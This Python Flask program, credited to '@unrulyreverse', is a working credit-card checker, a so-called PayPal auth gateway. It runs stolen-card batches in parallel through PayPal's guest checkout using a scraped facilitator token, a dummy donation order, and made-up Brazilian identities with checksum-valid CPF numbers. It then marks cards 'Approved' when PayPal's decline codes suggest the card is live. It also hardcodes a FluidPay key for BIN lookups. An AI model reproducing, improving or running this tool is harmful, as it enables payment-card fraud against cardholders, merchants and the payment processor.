#An0nOtF Technologies Inc
import requests
import random
import json
import re
import time
import os
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import socket

app = Flask(__name__)
CORS(app)

requests.packages.urllib3.disable_warnings()

# ============ CONFIGURATION ============
MAX_WORKERS = 15
REQUEST_TIMEOUT = 30
PORT = int(os.environ.get("PORT", 5000))

# ============ UTILITY FUNCTIONS ============

def multiexplode(string):
    delimiters = ["|", ";", ":", "/", "»", "«", ">", "<"]
    for delim in delimiters:
        string = string.replace(delim, "|")
    return string.split("|")

def get_str(string, start, end):
    try:
        str_split = string.split(start)
        return str_split[1].split(end)[0]
    except:
        return ""

def generate_contact_info():
    return {
        'celular': str(random.randint(1000000000, 9999999999)),
        'endereco': f"{generate_nome_aleatorio()}, {random.randint(1, 1000)}, {generate_bairro_aleatorio()}, {generate_cidade_aleatorio()}",
        'estado': generate_estado_aleatorio(),
        'cidade': generate_cidade_aleatorio(),
        'cep': generate_cep_aleatorio()
    }

def generate_nome_aleatorio():
    nomes = ["rua", "avenida", "pra a", "estrada", "travessa"]
    return random.choice(nomes)

def generate_bairro_aleatorio():
    bairro = ["centro", "jardim", "cidade universitaria", "vila", "chacara"]
    return random.choice(bairro)

def generate_cidade_aleatorio():
    cidades = ["Sao Paulo", "Rio de Janeiro", "Brasilia", "Curitiba", "Florianopolis"]
    return random.choice(cidades)

def generate_estado_aleatorio():
    estados = ["SP", "RJ", "DF", "PR", "SC"]
    return random.choice(estados)

def generate_cep_aleatorio():
    cep = random.randint(10000000, 99999999)
    return f"{cep:08d}"

def generate_email():
    domains = ["gmail.com", "hotmail.com", "yahoo.com", "outlook.com"]
    domain = random.choice(domains)
    timestamp = int(datetime.now().timestamp())
    random_num = random.randint(1, 10000)
    return f"user_{timestamp}_{random_num}@{domain}"

def nome_aleatorio():
    nomes = {
        1: 'Lucas', 2: 'Ana', 3: 'Lucia', 4: 'Maria', 5: 'Alice',
        6: 'Fernando', 7: 'Marcos', 8: 'Ronaldo', 9: 'Julia', 10: 'Arthur',
        11: 'Gabriel', 12: 'Juliana', 13: 'Bruno', 14: 'Carla', 15: 'Roberto',
        16: 'Patricia', 17: 'Felipe', 18: 'Leticia', 19: 'Mateus', 20: 'Julio',
        21: 'Amanda', 22: 'Rafael', 23: 'Renata', 24: 'Ricardo', 25: 'Sofia',
        26: 'Anderson', 27: 'Bianca', 28: 'Vinicius', 29: 'Simone', 30: 'Eduardo',
        31: 'Tatiane', 32: 'Marcelo', 33: 'Vanessa', 34: 'Lucas', 35: 'Tatiane',
        36: 'Paula', 37: 'Joao', 38: 'Camila', 39: 'Jorge', 40: 'Elaine',
        41: 'Ivan', 42: 'Eliane', 43: 'Luana', 44: 'Thiago', 45: 'Sandra',
        46: 'Gustavo', 47: 'Cristiane', 48: 'Marcio', 49: 'Claudia', 50: 'Andressa'
    }
    return random.choice(list(nomes.values()))

def sobrenome_aleatorio():
    sobrenomes = {
        1: 'Silva', 2: 'Santos', 3: 'Pereira', 4: 'Ferreira', 5: 'Oliveira',
        6: 'Ribeiro', 7: 'Rodrigues', 8: 'Almeida', 9: 'Lima', 10: 'Carvalho',
        11: 'Gomes', 12: 'Martins', 13: 'Costa', 14: 'Moreira', 15: 'Mendes',
        16: 'Araujo', 17: 'Campos', 18: 'Nogueira', 19: 'Teixeira', 20: 'Pinto'
    }
    return random.choice(list(sobrenomes.values()))

def generate_cpf():
    n = [random.randint(0, 9) for _ in range(9)]
    d1 = sum(n[i] * (10 - i) for i in range(9))
    d1 = 11 - (d1 % 11)
    d1 = 0 if d1 >= 10 else d1
    n.append(d1)
    d2 = sum(n[i] * (11 - i) for i in range(10))
    d2 = 11 - (d2 % 11)
    d2 = 0 if d2 >= 10 else d2
    n.append(d2)
    return ''.join(map(str, n))

def generate_card_type(credit_card_number):
    first_digit = credit_card_number[0]
    if first_digit in ['2', '5']:
        return 'MASTER_CARD'
    elif first_digit == '3':
        return 'AMEX'
    elif first_digit == '4':
        return 'VISA'
    elif first_digit == '6':
        return 'DISCOVER'
    else:
        return 'UNKNOWN'

def get_fluidpay_details(bin_num):
    try:
        headers = {
            'Authorization': 'pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            'Content-Type': 'application/json',
        }
        data = {
            'type': 'tokenizer',
            'type_id': '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
            'bin': bin_num,
        }
        response = requests.post(
            'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            headers=headers,
            json=data,
            timeout=10
        )
        response_data = response.json()
        if response_data.get('status') == 'success':
            data = response_data['data']
            details_parts = [
                data.get('card_brand', ''),
                data.get('issuing_bank', ''),
                data.get('card_level_generic', ''),
                data.get('country', '').upper(),
                data.get('card_type', 'CREDIT').upper()
            ]
            details = ' '.join(filter(None, details_parts))
            return {
                'success': True,
                'details': details.upper().strip()
            }
        else:
            return {
                'success': False,
                'details': response_data.get('msg', 'Unknown error.').upper()
            }
    except Exception as e:
        return {
            'success': False,
            'details': f'Request error: {str(e)}'
        }

def execute_curl(url, method, headers, post_fields=None):
    try:
        session = requests.Session()
        session.verify = False
        if method.upper() == 'GET':
            response = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method.upper() == 'POST':
            response = session.post(url, headers=headers, data=post_fields, timeout=REQUEST_TIMEOUT)
        else:
            response = session.request(method, url, headers=headers, data=post_fields, timeout=REQUEST_TIMEOUT)
        return response.text
    except requests.exceptions.Timeout:
        return '{"error": "TIMEOUT"}'
    except Exception as e:
        return f'{{"error": "{str(e)}"}}'

def get_paypal_token():
    try:
        response = execute_curl(
            "https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVh2QzNFc21jMTc2bklUZDhvSVVpVldNRzBjNm4tVkpuSlBjSWFWU0UtdDFJLVFudWx4dTRPSEN3RE44MGhfa0YtTmNabkszQWkwTFJ4SFImY3VycmVuY3k9VVNEJmVuYWJsZS1mdW5kaW5nPXBheWxhdGVyLHZlbm1vJm1lcmNoYW50LWlkPUtaVEU2UUM0OUZETDgmY29tcG9uZW50cz1mdW5kaW5nLWVsaWdpYmlsaXR5LGJ1dHRvbnMiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9qaG5iZHZ0anFzZXF4bnZkdGxibHdlY2t5Y2VvcmIifX0&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg6nde&supportedNativeBrowser=false&supportsPopups=true&vault=false",
            "GET",
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "Referer": "https://checkout-app.svc.shoplightspeed.com/",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive"
            }
        )
        token = get_str(response, 'facilitatorAccessToken":"', '"')
        if token:
            return token
        else:
            return None
    except Exception as e:
        return None

def create_paypal_order(token):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Authorization": "Bearer " + token,
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        response = execute_curl(
            "https://www.paypal.com/v2/checkout/orders",
            "POST",
            headers,
            '{"purchase_units":[{"amount":{"value":1,"currency_code":"EUR"},"description":"Donation"}],"application_context":{"shipping_preference":"NO_SHIPPING"},"intent":"CAPTURE"}'
        )
        order_id = get_str(response, 'id":"', '"')
        if order_id:
            return order_id
        else:
            return None
    except Exception as e:
        return None

def process_single_card(cc, month, year, cvv):
    """Process a single card and return result"""
    start_time = time.time()
    
    try:
        # Clean inputs
        cc = cc.strip()
        month = month.strip()
        year = year.strip()
        cvv = cvv.strip()
        
        # Get BIN info
        bin_result = get_fluidpay_details(cc[:6])
        bin_info = bin_result['details'] if bin_result['success'] else f"BIN: {cc[:6]}"
        
        # Check expiration
        ano = '20' + year if len(year) == 2 else year
        mes = month.zfill(2)
        ano_atual = datetime.now().year
        mes_atual = datetime.now().month
        
        if int(ano) < ano_atual or (int(ano) == ano_atual and int(mes) < mes_atual):
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'cc': cc,
                'month': month,
                'year': year,
                'cvv': cvv,
                'status': 'Declined',
                'message': 'CARD EXPIRED',
                'bin_info': bin_info,
                'time': f"{elapsed_time}s",
                'gate': 'PayPal',
                'dev': '@unrulyreverse',
                'credits': 'An0nOtF Technologies Inc 💎'
            }
        
        card_type = generate_card_type(cc)
        
        token = get_paypal_token()
        if not token:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'cc': cc,
                'month': month,
                'year': year,
                'cvv': cvv,
                'status': 'Declined',
                'message': 'FAILED TO OBTAIN PAYPAL TOKEN',
                'bin_info': bin_info,
                'time': f"{elapsed_time}s",
                'gate': 'PayPal',
                'dev': '@unrulyreverse',
                'credits': 'An0nOtF Technologies Inc 💎'
            }
        
        order_id = create_paypal_order(token)
        if not order_id:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'cc': cc,
                'month': month,
                'year': year,
                'cvv': cvv,
                'status': 'Declined',
                'message': 'FAILED TO CREATE PAYPAL ORDER',
                'bin_info': bin_info,
                'time': f"{elapsed_time}s",
                'gate': 'PayPal',
                'dev': '@unrulyreverse',
                'credits': 'An0nOtF Technologies Inc 💎'
            }
        
        contact_info = generate_contact_info()
        celular = contact_info['celular']
        endereco = contact_info['endereco']
        estado = contact_info['estado']
        cidade = contact_info['cidade']
        cep = contact_info['cep']
        email = generate_email()
        nome = nome_aleatorio()
        sobrenome = sobrenome_aleatorio()
        cpf = generate_cpf()
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Paypal-Client-Context": order_id,
            "Paypal-Client-Metadata-Id": order_id,
            "X-Country": "BR",
            "X-App-Name": "standardcardfields",
            "Origin": "https://www.paypal.com",
            "Accept": "application/json",
        }
        
        payload = f'{{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {{\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {{\\n                flags {{\\n                    is3DSecureRequired\\n                }}\\n                cart {{\\n                    intent\\n                    cartId\\n                    buyer {{\\n                        userId\\n                        auth {{\\n                            accessToken\\n                        }}\\n                    }}\\n                    returnUrl {{\\n                        href\\n                    }}\\n                }}\\n                paymentContingencies {{\\n                    threeDomainSecure {{\\n                        status\\n                        method\\n                        redirectUrl {{\\n                            href\\n                        }}\\n                        parameter\\n                    }}\\n                }}\\n            }}\\n        }}\\n        ","variables":{{"token":"{order_id}","card":{{"cardNumber":"{cc}","type":"{card_type}","expirationDate":"{mes}/{ano}","postalCode":"{cep}","securityCode":"{cvv}","productClass":"CREDIT"}},"phoneNumber":"{celular}","firstName":"{nome} {sobrenome}","lastName":"DEV","billingAddress":{{"givenName":"{nome} {sobrenome}","familyName":"DEV","state":"{estado}","country":"BR","postalCode":"{cep}","line1":"{endereco}","line2":"","city":"{cidade}"}},"email":"{email}","currencyConversionType":"VENDOR","identityDocument":{{"value":"{cpf}","type":"CPF"}}}},"operationName":null}}'
        
        response = execute_curl(
            "https://www.paypal.com/graphql?fetch_credit_form_submit",
            "POST",
            headers,
            payload
        )
        
        # Parse response
        try:
            response_data = json.loads(response)
            if 'errors' in response_data and len(response_data['errors']) > 0:
                if 'data' in response_data['errors'][0] and len(response_data['errors'][0]['data']) > 0:
                    code = response_data['errors'][0]['data'][0]['code']
                    response_message = code
                else:
                    code = response_data['errors'][0].get('message', 'UNKNOWN_ERROR')
                    response_message = code
            else:
                code = "SUCCESS"
                response_message = "SUCCESS"
        except:
            response_upper = response.upper()
            if "RISK_DISALLOWED" in response_upper:
                code = "RISK_DISALLOWED"
                response_message = "RISK_DISALLOWED"
            elif "INVALID_SECURITY_CODE" in response_upper:
                code = "INVALID_SECURITY_CODE"
                response_message = "INVALID_SECURITY_CODE"
            elif "INVALID_BILLING_ADDRESS" in response_upper:
                code = "INVALID_BILLING_ADDRESS"
                response_message = "INVALID_BILLING_ADDRESS"
            elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper:
                code = "EXISTING_ACCOUNT_RESTRICTED"
                response_message = "EXISTING_ACCOUNT_RESTRICTED"
            elif "GENERIC_CARD_ERROR" in response_upper:
                code = "GENERIC_CARD_ERROR"
                response_message = "GENERIC_CARD_ERROR"
            elif "OAS_VALIDATION" in response_upper:
                code = "OAS_VALIDATION"
                response_message = "OAS_VALIDATION"
            elif "INVALID_EXPIRATION" in response_upper:
                code = "INVALID_EXPIRATION"
                response_message = "INVALID_EXPIRATION"
            elif "VALIDATION_ERROR" in response_upper:
                code = "VALIDATION_ERROR"
                response_message = "VALIDATION_ERROR"
            elif "SUCCESS" in response_upper or "APPROVED" in response_upper:
                code = "SUCCESS"
                response_message = "SUCCESS"
            else:
                code = "UNKNOWN_ERROR"
                response_message = "UNKNOWN_ERROR"
        
        approved_codes = [
            "EXISTING_ACCOUNT_RESTRICTED",
            "INVALID_BILLING_ADDRESS",
            "INVALID_SECURITY_CODE",
            "SUCCESS",
            "RISK_DISALLOWED",
            "is3DSecureRequired"
        ]
        
        if code in approved_codes:
            status = 'Approved'
        else:
            if "RISK" in code or "SECURITY" in code or "BILLING" in code:
                status = 'Approved'
            else:
                status = 'Declined'
        
        elapsed_time = round(time.time() - start_time, 2)
        
        return {
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'status': status,
            'message': response_message,
            'bin_info': bin_info,
            'time': f"{elapsed_time}s",
            'gate': 'PayPal',
            'dev': '@unrulyreverse',
            'credits': 'An0nOtF Technologies Inc 💎'
        }
        
    except Exception as e:
        elapsed_time = round(time.time() - start_time, 2)
        return {
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'status': 'Declined',
            'message': f'EXCEPTION: {str(e)}',
            'bin_info': f'BIN: {cc[:6]}',
            'time': f"{elapsed_time}s",
            'gate': 'PayPal',
            'dev': '@unrulyreverse',
            'credits': 'An0nOtF Technologies Inc 💎'
        }

# ============ API ENDPOINTS ============

@app.route('/api/gateway/PaypalAuth', methods=['GET', 'POST', 'OPTIONS'])
def paypal_auth():
    # Handle OPTIONS for CORS preflight
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    cc = ''
    month = ''
    year = ''
    cvv = ''
    
    if request.method == 'GET':
        # Get parameters from URL
        cc = request.args.get('cc', '')
        month = request.args.get('month', '')
        year = request.args.get('year', '')
        cvv = request.args.get('cvv', '')
        
    else:
        data = request.get_json() or {}
        cc = data.get('cc', '')
        month = data.get('month', '')
        year = data.get('year', '')
        cvv = data.get('cvv', '')
    
    # Remove any spaces from cc
    cc = cc.strip()
    
    # Check if pipe format is used (has | and no separate month/year/cvv)
    if '|' in cc and (not month or not year or not cvv):
        parts = multiexplode(cc)
        if len(parts) >= 4:
            cc = parts[0]
            month = parts[1]
            year = parts[2]
            cvv = parts[3]
            result = process_single_card(cc, month, year, cvv)
            return jsonify(result)
    
    # Check for multiple cards (comma separated)
    if ',' in cc and (not month or not year or not cvv):
        cards = [c.strip() for c in cc.split(',') if c.strip()]
        
        card_list = []
        for card in cards:
            if '|' in card:
                parts = multiexplode(card)
                if len(parts) >= 4:
                    card_list.append({
                        'cc': parts[0],
                        'month': parts[1],
                        'year': parts[2],
                        'cvv': parts[3]
                    })
        
        if not card_list:
            return jsonify({'error': 'No valid cards provided'}), 400
        
        results = []
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for card_data in card_list:
                future = executor.submit(
                    process_single_card, 
                    card_data['cc'], 
                    card_data['month'], 
                    card_data['year'], 
                    card_data['cvv']
                )
                futures.append(future)
            
            for future in concurrent.futures.as_completed(futures):
                results.append(future.result())
        
        return jsonify({
            'total': len(results),
            'approved': sum(1 for r in results if r['status'] == 'Approved'),
            'declined': sum(1 for r in results if r['status'] == 'Declined'),
            'results': results
        })
    
    # Single card check
    if not cc or not month or not year or not cvv:
        return jsonify({
            'error': 'Missing parameters',
            'usage': '/api/gateway/PaypalAuth?cc=CARD_NUMBER|MM|YYYY|CVV',
            'example': '/api/gateway/PaypalAuth?cc=5154620021117450|05|2030|210',
            'example_separate': '/api/gateway/PaypalAuth?cc=5154620021117450&month=05&year=2030&cvv=210'
        }), 400
    
    result = process_single_card(cc, month, year, cvv)
    return jsonify(result)

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'running',
        'workers': MAX_WORKERS,
        'gateway': 'PayPal',
        'port': PORT,
        'dev': '@unrulyreverse',
        'credits': 'An0nOtF Technologies Inc 💎'
    })

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'name': 'PayPal Auth Gateway API',
        'version': '1.0.0',
        'endpoints': {
            '/api/gateway/PaypalAuth': 'GET - Check card (use ?cc=XXXX|MM|YYYY|CVV)',
            '/api/health': 'GET - Health check'
        },
        'examples': {
            'single_card': '/api/gateway/PaypalAuth?cc=5154620021117450|05|2030|210',
            'separate_params': '/api/gateway/PaypalAuth?cc=5154620021117450&month=05&year=2030&cvv=210',
            'multiple_cards': '/api/gateway/PaypalAuth?cc=5154620021117450|05|2030|210,5434460000527797|04|2026|990'
        },
        'dev': '@unrulyreverse',
        'credits': 'An0nOtF Technologies Inc 💎'
    })

def get_local_ips():
    ips = []
    try:
        hostname = socket.gethostname()
        ips.append(('localhost', '127.0.0.1'))
        for ip in socket.gethostbyname_ex(hostname)[2]:
            if not ip.startswith('127.'):
                ips.append((hostname, ip))
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            default_ip = s.getsockname()[0]
            if default_ip not in [ip for _, ip in ips]:
                ips.append(('default', default_ip))
        except:
            pass
        finally:
            s.close()
    except:
        ips.append(('localhost', '127.0.0.1'))
    return ips

if __name__ == '__main__':
    print("""
\033[1;36m
██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗  
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝  
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ 
\033[0m
    """)
    print("=" * 60)
    print("PAYPAL AUTH GATEWAY API ")
    print("Dev: @unrulyreverse")
    print("Credits: An0nOtF Technologies Inc 💎")
    print("=" * 60)
    print(f"\n⚡ Concurrent Workers: {MAX_WORKERS}")
    print(f"\n📡 Listening on HTTP port {PORT}")
    
    # Display access URLs
    ips = get_local_ips()
    print("\n🔗 Access URLs:")
    print("-" * 40)
    for name, ip in ips:
        print(f"   🌐 http://{ip}:{PORT}")
    
    print("-" * 40)
    print("\n📖 API Endpoint:")
    print("   GET /api/gateway/PaypalAuth?cc=XXXX|MM|YYYY|CVV")
    print("-" * 40)
    print("\n📝 Example Requests:")
    print(f'   curl "http://localhost:{PORT}/api/gateway/PaypalAuth?cc=5154620021117450|05|2030|210"')
    print(f'   curl "http://localhost:{PORT}/api/gateway/PaypalAuth?cc=5154620021117450&month=05&year=2030&cvv=210"')
    print(f'   curl "http://{ips[1][1] if len(ips) > 1 else "192.168.1.100"}:{PORT}/api/gateway/PaypalAuth?cc=5154620021117450|05|2030|210"')
    print("\n✅ API Ready! Press Ctrl+C to stop")
    print("=" * 60)
    
    # Run HTTP server only
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)